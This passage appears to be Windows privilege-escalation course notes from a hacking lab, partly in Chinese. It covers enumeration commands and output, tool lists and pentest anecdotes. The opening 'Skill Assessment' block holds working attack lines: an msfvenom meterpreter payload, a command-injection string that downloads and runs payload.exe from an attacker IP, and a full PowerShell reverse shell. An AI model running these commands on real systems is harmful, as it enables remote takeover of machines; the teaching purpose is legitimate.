<pre><code>python3 mremoteng_decrypt.py -s "s1lN9UQqWy2QFv2aKVGFa2YRfFvpObytu04vyCuVQi12M0kyV3Xc0xwAlTz0aSNRiR3Rilf6Xb4XQ="</code></pre>
<h3>Miscellaneous Techniques</h3>
<h2>Skill Assessment</h2>
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.137 LPORT=9919 -f exe -o payload.exe  
  
python3 -m http.server


set lhost 10.10.15.137

127.0.0.1 &amp; powershell -c “Invoke-WebRequest -Uri [http://10.10.15.137:8000/payload.exe](http://10.10.15.137/payload.exe) -OutFile C:\Windows\Temp\payload.exe; Start-Process C:\Windows\Temp\payload.exe”


127.0.0.1 &amp; powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.137',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2&gt;&amp;1 | Out-String );$sendback2=$sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte=[text.encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre>`,
      zh: String.raw`<h2>介绍</h2>
<p>权限提升的总体目标是将我们对特定系统的访问权限提升到组成员<code>Local Administrators</code>或<code>NT AUTHORITY\SYSTEM</code> 本地系统帐户。然而，在某些情况下，提升到系统上的其他用户就足以实现我们的目标。权限提升通常是任何攻击活动中至关重要的一步。我们需要使用获得的访问权限，或者只有在提升权限的上下文中进行会话后才能找到的某些数据（例如凭据）。在某些情况下，如果客户聘请我们进行“黄金映像”或“工作站突破”类型的评估，权限提升可能是评估的最终目标。权限提升通常对于通过网络继续实现我们的最终目标以及横向移动至关重要。</p>
<p>话虽如此，我们可能需要提升权限，原因如下：</p>
<ol><li>在测试客户端的黄金映像Windows 工作站和服务器构建是否存在缺陷时</li><li>在本地提升权限以获取对某些本地资源（例如数据库）的访问权限</li><li>在加入域的计算机上获取<a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" target="_blank" rel="noreferrer">NT AUTHORITY\System</a>级别访问权限，从而进入客户端的 Active Directory 环境</li><li>获取凭证以在客户端网络内横向移动或提升权限</li></ol>
<p>了解如何执行提权检查并<code>manually</code>在特定场景下尽可能地利用漏洞也至关重要。我们可能会遇到这样的情况：客户将我们安置在一个托管工作站上，该工作站没有互联网访问权限，防火墙严密，USB 端口也被禁用，因此我们无法加载任何工具/辅助脚本。在这种情况下，熟练掌握使用 PowerShell 和 Windows 命令行进行 Windows 提权检查至关重要。</p>
<p>系统存在巨大的攻击面。我们可以通过以下几种方式来提升权限：</p>
<ul><li>滥用Windows组权限</li><li>滥用Windows用户权限</li><li>绕过用户账户控制</li><li>滥用弱服务/文件权限</li><li>利用位修补的内核漏洞</li><li>凭证盗窃</li><li>流量捕获</li></ul>
<p><strong>场景1 - 克服网络限制</strong> 我曾经接到一个任务，在客户端提供的系统上提升权限，该系统没有网络连接，USB 端口也被屏蔽。由于网络访问控制的存在，我无法将攻击机直接接入用户网络来协助我。在评估期间，我已经发现了一个网络漏洞，其中打印机 VLAN 配置为允许通过端口 80、443 和 445 进行出站通信。我使用手动枚举方法找到了一个与权限相关的漏洞，该漏洞允许我提升权限并手动执行<code>LSASS</code>进程的内存转储。之后，我能够在打印机 VLAN 上挂载托管在攻击机上的 SMB 共享，并提取<code>LSASS</code>DMP 文件。有了这个文件，我使用<code>Mimikatz</code>离线方式检索了域管理员的 NTLM 密码哈希，我可以离线破解该哈希，并使用该哈希从客户端提供的系统访问域控制器。</p>
<p><strong>场景2 - 掠夺公开股份</strong> 在另一次评估中，我发现自己处于一个相当封闭的环境中，该环境受到良好的监控，没有任何明显的配置缺陷或正在使用的易受攻击的服务/应用程序。我发现了一个完全开放的文件共享，允许所有用户列出其内容并下载存储在其中的文件。此共享托管了环境中虚拟机的备份。我特别感兴趣的是虚拟硬盘文件（<code>.VMDK</code>和<code>.VHDX</code>文件）。我可以从 Windows VM 访问此共享，将<code>.VHDX</code>虚拟硬盘挂载为本地驱动器并浏览文件系统。从这里，我检索了<code>SYSTEM</code>、<code>SAM</code>和注册表配置单元，将它们移动到我的 Linux 攻击箱中，并使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" target="_blank" rel="noreferrer">secretsdump.py</a><code>SECURITY</code>工具提取了本地管理员密码哈希。该组织恰好使用的是黄金映像，并且可以使用本地管理员哈希通过传递哈希攻击获得几乎所有 Windows 系统的管理员访问权限。</p>
<p><strong>场景3 - 获取凭证并滥用账户权限</strong> 在最后一个场景中，我被置于一个相当封闭的网络中，目标是访问关键的数据库服务器。客户给我提供了一台带有标准域用户帐户的笔记本电脑，我可以在上面加载工具。最终，我运行了<a href="https://github.com/SnaffCon/Snaffler" target="_blank" rel="noreferrer">Snaffler</a>工具来搜索文件共享中的敏感信息。我发现一些<code>.sql</code>文件包含指向他们其中一台数据库服务器上某个数据库的低权限数据库凭证。我使用本地 MSSQL 客户端，通过数据库凭证连接到数据库，启用<a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" target="_blank" rel="noreferrer">xp_cmdshell</a>存储过程并获得本地命令执行权限。使用此服务帐户访问权限，我确认​​我拥有<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege" target="_blank" rel="noreferrer">SeImpersonatePrivilege</a>权限，这可以用来进行本地提权。我下载了一个自定义编译版本的<a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noreferrer">Juicy Potato</a>到主机以协助提权，并成功添加了本地管理员用户。添加用户的效果并不理想，但我尝试获取信标/反向 Shell 却失败了。通过此访问权限，我能够远程访问数据库主机，并完全控制该公司其中一个客户的数据库。</p>
<p><strong>通过FreeRDP连接</strong> 我们可以通过命令行连接，使用命令<code>xfreerdp /v:&lt;target ip&gt; /u:htb-student</code>并在提示符下输入提供的密码。大多数部分都会提供用户凭证<code>htb-student</code>，但有些部分（根据具体内容）会要求您使用其他用户进行 RDP 连接，并提供备用凭证。</p>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$  xfreerdp /v:10.129.43.36 /u:htb-student

[21:17:27:323] [28158:28159] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[21:17:27:323] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[21:17:27:324] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[21:17:27:324] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[21:17:27:648] [28158:28159] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[21:17:27:672] [28158:28159] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[21:17:27:672] [28158:28159] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[21:17:28:770] [28158:28159] [INFO][com.freerdp.crypto] - creating directory /home/user2/.config/freerdp
[21:17:28:770] [28158:28159] [INFO][com.freerdp.crypto] - creating directory [/home/user2/.config/freerdp/certs]
[21:17:28:771] [28158:28159] [INFO][com.freerdp.crypto] - created directory [/home/user2/.config/freerdp/server]
[21:17:28:794] [28158:28159] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[21:17:28:794] [28158:28159] [WARN][com.freerdp.crypto] - CN = WINLPE-SKILLS1-SRV
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.43.36:3389) 
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - Common Name (CN):
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - 	WINLPE-SKILLS1-SRV
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.43.36:3389 (RDP-Server):
	Common Name: WINLPE-SKILLS1-SRV
	Subject:     CN = WINLPE-SKILLS1-SRV
	Issuer:      CN = WINLPE-SKILLS1-SRV
	Thumbprint:  9f:f0:dd:28:f5:6f:83:db:5e:8c:5a:e9:5f:50:a4:50:2d:b3:e7:a7:af:f4:4a:8a:1a:08:f3:cb:46:c3:c3:e8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
Password: </code></pre>
<p>模块的许多部分都需要一些工具，例如开源脚本、预编译二进制文件和漏洞利用 PoC。如果适用，这些工​​具可以在<code>C:\Tools</code>目标主机的目录中找到。尽管大多数工具都已提供，但您也可以挑战自己，尝试将文件上传到目标主机（使用文件传输模块中展示的技术），甚至可以使用<a href="https://visualstudio.microsoft.com/downloads/" target="_blank" rel="noreferrer">Visual Studio</a>自行编译一些工具。</p>
<p><strong>Useful Tools</strong></p>
<div class="post-table-wrap"><table><thead><tr><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://github.com/GhostPack/Seatbelt" target="_blank" rel="noreferrer">Seatbelt</a></td><td>用于执行各种本地权限提升检查的 C# 项目</td></tr><tr><td><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" target="_blank" rel="noreferrer">winPEAS</a></td><td>是一个脚本，用于在 Windows 主机上搜索可能的提权路径。所有检查的说明如下：</td></tr><tr><td><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" target="_blank" rel="noreferrer">PowerUp</a></td><td>用于查找依赖于错误配置的常见 Windows 提权向量的 PowerShell 脚本。它还可以用来利用已发现的一些问题。</td></tr><tr><td><a href="https://github.com/GhostPack/SharpUp" target="_blank" rel="noreferrer">SharpUp</a></td><td>C# 版本的 PowerUp</td></tr><tr><td><a href="https://github.com/411Hall/JAWS" target="_blank" rel="noreferrer">JAWS</a></td><td>用 PowerShell 2.0 编写的用于枚举权限提升向量的 PowerShell 脚本</td></tr><tr><td><a href="https://github.com/Arvanaghi/SessionGopher" target="_blank" rel="noreferrer">SessionGopher</a></td><td>是一款 PowerShell 工具，用于查找并解密远程访问工具保存的会话信息。它可以提取 PuTTY、WinSCP、SuperPuTTY、FileZilla 和 RDP 保存的会话信息。</td></tr><tr><td><a href="https://github.com/rasta-mouse/Watson" target="_blank" rel="noreferrer">Watson</a></td><td>是一个 .NET 工具，旨在枚举缺失的 KB 并建议利用权限提升漏洞。</td></tr><tr><td><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noreferrer">LaZagne</a></td><td>用于从 Web 浏览器、聊天工具、数据库、Git、电子邮件、内存转储、PHP、系统管理工具、无线网络配置、内部 Windows 密码存储机制等检索存储在本地计算机上的密码的工具</td></tr><tr><td><a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noreferrer">Windows Exploit Suggester - Next Generation</a></td><td>是一款基于 Windows 实用程序输出的工具<code>systeminfo</code>，它提供了操作系统易受攻击的漏洞列表，以及针对这些漏洞的任何利用方式。它支持 Windows XP 到 Windows 10 之间的所有 Windows 操作系统，包括其对应的 Windows Server 版本。</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noreferrer">Sysinternals Suite</a></td><td>我们将在枚举中使用 Sysinternals 的几种工具，包括<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" target="_blank" rel="noreferrer">AccessChk</a>、<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist" target="_blank" rel="noreferrer">PipeList</a>和<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice" target="_blank" rel="noreferrer">PsService</a></td></tr></tbody></table></div>
<h2>态势感知与环境摸底</h2>
<h3>态势感知</h3>
<p>无论身处何种境地，无论是在日常生活中，还是在网络渗透测试等项目中，时刻把握时间和空间的定位都至关重要。</p>
<p>收集网络信息是我们枚举的关键部分。我们可能会发现主机是双宿主的，而攻陷该主机可能使我们能够横向移动到之前无法访问的网络的另一部分。双宿主意味着主机或服务器属于两个或多个不同的网络，并且在大多数情况下具有多个虚拟或物理网络接口。我们应该始终查看路由表，以查看有关本地网络及其周围网络的信息。我们还可以收集有关本地域的信息（如果主机是Active Directory环境的一部分），包括域控制器的IP地址。使用arp命令查看每个接口的ARP缓存并查看主机最近与之通信的其他主机也很重要。这可以帮助我们在获取凭据后进行横向移动。它可以很好地指示管理员正在通过RDP或WinRM从该主机连接到哪些主机。</p>
<ol><li><strong>网络信息</strong></li></ol>
<p>这些网络信息可能直接或间接地帮助我们提升本地权限。它可能会引导我们通过另一条路径访问某个系统，以便我们能够访问或提升权限；或者，它可能会泄露一些信息，让我们能够利用这些信息进行横向移动，从而在当前系统上提升权限后进一步获得访问权限。</p>
<p><strong>接口、IP地址、DNS信息</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; ipconfig /all</code></pre>
<p><strong>ARP表</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; arp -a</code></pre>
<p><strong>路由表</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; route print</code></pre>
<p>枚举现有的保护措施将有助于我们确保所使用的方法不会被阻止或检测到，并且在我们必须编写自定义 Payload 或在编译工具之前对其进行修改时，这也会对我们有所帮助。</p>
<ol><li><strong>枚举保护措施</strong></li></ol>
<p>许多组织使用某种应用程序白名单解决方案来控制某些用户可以运行哪些类型的应用程序和文件。这可能被用来尝试阻止非管理员用户运行<code>cmd.exe</code>其<code>powershell.exe</code>日常工作不需要的其他二进制文件和文件类型。Microsoft 提供的一个常用解决方案是<a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview" target="_blank" rel="noreferrer">AppLocker</a>。我们可以使用<a href="https://docs.microsoft.com/en-us/powershell/module/applocker/get-applockerpolicy?view=windowsserver2019-ps" target="_blank" rel="noreferrer">GetAppLockerPolicy</a> cmdlet 枚举本地、有效（强制执行）和域 AppLocker 策略。这将帮助我们了解哪些二进制文件或文件类型可能被阻止，以及我们是否需要在枚举过程中或在运行工具或技术来提升权限之前执行某种 AppLocker 绕过。</p>
<ul><li>检查Windows Defender状态</li></ul>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-MpComputerStatus

AMEngineVersion                 : 1.1.17900.7
AMProductVersion                : 4.10.14393.2248
AMServiceEnabled                : True
AMServiceVersion                : 4.10.14393.2248
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 3/28/2021 2:59:13 AM
AntispywareSignatureVersion     : 1.333.1470.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1
AntivirusSignatureLastUpdated   : 3/28/2021 2:59:12 AM
AntivirusSignatureVersion       : 1.333.1470.0
BehaviorMonitorEnabled          : False
ComputerID                      : 54AF7DE4-3C7E-4DA0-87AC-831B045B9063
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : False
LastFullScanSource              : 0
LastQuickScanSource             : 0
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 0.0.0.0
OnAccessProtectionEnabled       : False
QuickScanAge                    : 4294967295
QuickScanEndTime                :
QuickScanStartTime              :
RealTimeProtectionEnabled       : False
RealTimeScanDirection           : 0
PSComputerName                  :</code></pre>
<ul><li>列出 AppLocker 规则</li></ul>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
Name                : (Default Rule) All signed packaged apps
Description         : Allows members of the Everyone group to run packaged apps that are signed.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files
                      folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
Name                : (Default Rule) All files
Description         : Allows members of the local Administrators group to run all applications.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : b7af7102-efde-4369-8a89-7a6a392d1473
Name                : (Default Rule) All digitally signed Windows Installer files
Description         : Allows members of the Everyone group to run digitally signed Windows Installer files.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\Installer\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 5b290184-345a-4453-b184-45305f6d9a54
Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
Description         : Allows members of the Everyone group to run all Windows Installer files located in
                      %systemdrive%\Windows\Installer.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*.*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
Name                : (Default Rule) All Windows Installer files
Description         : Allows members of the local Administrators group to run all Windows Installer files.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name                : (Default Rule) All scripts located in the Windows folder
Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : ed97d0cb-15ff-430f-b82c-8d7832957725
Name                : (Default Rule) All scripts
Description         : Allows members of the local Administrators group to run all scripts.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow</code></pre>
<ul><li>测试 AppLocker 策略</li></ul>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

FilePath                    PolicyDecision MatchingRule
--------                    -------------- ------------
C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe


PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\*\*\*\*.exe -User Everyone
PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe -User Everyone
</code></pre>
<h3>初始枚举</h3>
<p>在评估过程中，我们可能会在 Windows 主机上获得低权限的 shell（无论是否已加入域），需要进行权限提升以进一步访问。完全入侵主机可能会让我们访问敏感文件/文件共享，获得捕获流量以获取更多凭证的能力，或者获得有助于进一步提升访问权限的凭证，甚至直接升级到 Active Directory 环境中的域管理员权限。根据系统配置和遇到的数据类型，我们可以将权限升级为以下之一：</p>
<ul><li>高度特权的 <code>NT AUTHORITY\SYSTEM</code> 账户，或称 <a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" target="_blank" rel="noreferrer">LocalSystem</a> 账户，这是一个拥有比本地管理员账户更多权限的高度特权账户，用于运行大多数 Windows 服务。</li><li>内置的本地<code>管理员</code>账户。有些组织禁用了该账户，但许多组织不会。在客户端环境中，该账户在多个系统间重复使用并不罕见。</li><li>另一个本地账户，是本地<code>管理员</code>组的成员。该组中的任何账户都将拥有与内置<code>管理员</code>账户相同的权限。</li><li>一个标准（非特权）域用户，属于本地<code>管理员</code>组。</li><li>一个域管理员（在 Active Directory 环境中拥有高度权限），属于本地<code>管理员组</code> 。</li></ul>
<p><strong>关键数据点</strong></p>
<ul><li><code>OS name</code> <code>系统名称</code> ：了解 Windows 作系统的类型（工作站或服务器）和级别（Windows 7 或 10，Server 2008、2012、2016、2019 等）可以让我们了解遗留系统中可能可用的工具类型（如 <code>PowerShell</code> 版本），或是否缺乏这些工具。这也能识别可能存在公开漏洞利用的作系统版本。</li><li><code>Version</code>: 与作系统版本类似，可能存在针对特定 Windows 版本漏洞的公开漏洞利用。Windows 系统漏洞可能导致系统不稳定甚至彻底崩溃。在任何生产系统上运行这些程序时都要小心，确保在运行前充分了解漏洞及其可能的后果。</li><li><code>Running Services</code> <code>运行服务</code> ：了解主机上运行的服务很重要，尤其是那些以 <code>NT AUTHORITY\SYSTEM</code> 或管理员级账户运行的服务。在特权账户中运行的服务配置错误或易受攻击，往往是权限升级的轻松优势。</li></ul>
<h4>系统信息</h4>
<p>查看系统本身能让我们更好地了解具体作系统版本、使用的硬件、已安装的程序和安全更新。这将帮助我们缩小寻找缺失补丁及相关 CVE 的范围，以便升级权限。使用<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist" target="_blank" rel="noreferrer">Tasklist</a>命令查看正在运行的进程，可以让我们更好地了解系统当前运行的应用程序。</p>
<pre><code class="language-cmd">Tasklist</code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
smss.exe                       316 N/A
csrss.exe                      424 N/A
wininit.exe                    528 N/A
csrss.exe                      540 N/A
winlogon.exe                   612 N/A
services.exe                   664 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 BrokerInfrastructure, DcomLaunch, LSM,
                                   PlugPlay, Power, SystemEventsBroker
svchost.exe                    836 RpcEptMapper, RpcSs
LogonUI.exe                    952 N/A
dwm.exe                        964 N/A
svchost.exe                    972 TermService
svchost.exe                   1008 Dhcp, EventLog, lmhosts, TimeBrokerSvc
svchost.exe                    364 NcbService, PcaSvc, ScDeviceEnum, TrkWks,
                                   UALSVC, UmRdpService
&lt;...SNIP...&gt;

svchost.exe                   1468 Wcmsvc
svchost.exe                   1804 PolicyAgent
spoolsv.exe                   1884 Spooler
svchost.exe                   1988 W3SVC, WAS
svchost.exe                   1996 ftpsvc
svchost.exe                   2004 AppHostSvc
FileZilla Server.exe          1140 FileZilla Server
inetinfo.exe                  1164 IISADMIN
svchost.exe                   1736 DiagTrack
svchost.exe                   2084 StateRepository, tiledatamodelsvc
VGAuthService.exe             2100 VGAuthService
vmtoolsd.exe                  2112 VMTools
MsMpEng.exe                   2136 WinDefend

&lt;...SNIP...&gt;

FileZilla Server Interfac     5628 N/A
jusched.exe                   5796 N/A
cmd.exe                       4132 N/A
conhost.exe                   4136 N/A
TrustedInstaller.exe          1120 TrustedInstaller
TiWorker.exe                  1816 N/A
WmiApSrv.exe                  2428 wmiApSrv
tasklist.exe                  3596 N/A</code></pre>
<p>熟悉标准的 Windows 进程，如会话管理器子系统（smss.exe）、 客户端服务器运行时子系统（csrss.exe）、<a href="https://en.wikipedia.org/wiki/Winlogon" target="_blank" rel="noreferrer">WinLogon（winlogon.exe）、</a> 本地安全机构子系统服务（LSASS） 和服务主机（svchost.exe） 等，以及与之相关的服务，是至关重要的。能够快速识别标准流程/服务将有助于加快我们的枚举速度，并使我们能够聚焦非标准流程/服务，从而可能开启权限升级的路径。在上述示例中，我们最感兴趣的是 <code>FileZilla</code> FTP 服务器的运行情况，并尝试枚举版本以查找公开漏洞或错误配置，如 FTP 匿名访问，这些可能导致敏感数据暴露甚至更多。</p>
<p>其他流程，比如 <code>MsMpEng.exe</code>、Windows Defender，也很有趣，因为它们可以帮助我们规划目标主机上可能需要规避或绕过的防护措施。</p>
<p><strong>显示所有环境变量</strong> 环境变量解释了主机配置的很多情况。要打印它们，Windows 会提供 <code>set</code> 命令。<code>PATH</code> 是最常被忽视的变量之一。在下面的输出中，没有任何异常。然而，管理员（或应用程序）修改 <code>PATH</code> 的情况并不罕见。一个常见的例子是将 Python 或 Java 置于路径中，这样可以执行 Python 或 。JAR 文件。如果放置在 PATH 中的文件夹是用户可写的，可能可以对其他应用程序进行 DLL 注入。记住，运行程序时，Windows 首先会在 CWD（当前工作目录）中查找该程序，然后从左到右从 PATH 查找该程序。这意味着如果自定义路径放在左侧（在 C：\Windows\System32 之前），它比右侧危险得多。</p>
<p>除了 PATH， <code>set</code>还可以提供其他有用信息，比如 HOME DRIVE。在企业中，这通常是文件共享。直接进入文件共享页面可能会显示其他可访问的目录。能够访问“IT 目录”并不罕见，该目录包含包含密码的库存表格。此外，共享用于家庭目录，用户可以登录其他电脑，拥有相同的体验/文件/桌面等（ 漫游配置文件 ）。这也可能意味着用户会携带恶意物品。如果文件被放置在 <code>USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup</code> 中，当用户登录另一台机器时，该文件将被执行。</p>
<pre><code class="language-cmd-session">C:\htb&gt; set

ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\Administrator\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=WINLPE-SRV01
ComSpec=C:\Windows\system32\cmd.exe
HOMEDRIVE=C:
HOMEPATH=\Users\Administrator
LOCALAPPDATA=C:\Users\Administrator\AppData\Local
LOGONSERVER=\\WINLPE-SRV01
NUMBER_OF_PROCESSORS=6
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
PROCESSOR_LEVEL=23
PROCESSOR_REVISION=3100
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC=C:\Users\Public
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
TMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
USERDOMAIN=WINLPE-SRV01
USERDOMAIN_ROAMINGPROFILE=WINLPE-SRV01
USERNAME=Administrator
USERPROFILE=C:\Users\Administrator
windir=C:\Windows </code></pre>
<p><strong>查看详细配置信息</strong> <code>systeminfo</code> 命令会显示该设备是否最近被打过修补，以及它是虚拟机。如果设备最近没有被修补，获得管理员级别访问权限可能只需运行已知的漏洞利用即可。谷歌热修复下安装的知识库，了解盒子什么时候被修补。这些信息并不总是存在，因为热修复软件可以对非管理员隐藏。还可以查看<code>系统启动时间</code>和<code>作系统版本</code> ，以了解补丁级别。如果盒子六个月以上没有重启，很可能也没有被修补。</p>
<p>此外，许多指南会说网络信息很重要，因为它可能表明机器是双宿主的（连接多个网络）。一般来说，对于企业来说，设备会通过防火墙规则获得访问其他网络的权限，而不会有实体线缆连接。</p>
<pre><code class="language-cmd-session">C:\htb&gt; systeminfo

Host Name:                 WINLPE-SRV01
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00376-30000-00299-AA303
Original Install Date:     3/24/2021, 3:46:32 PM
System Boot Time:          3/25/2021, 9:24:36 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              3 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [03]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
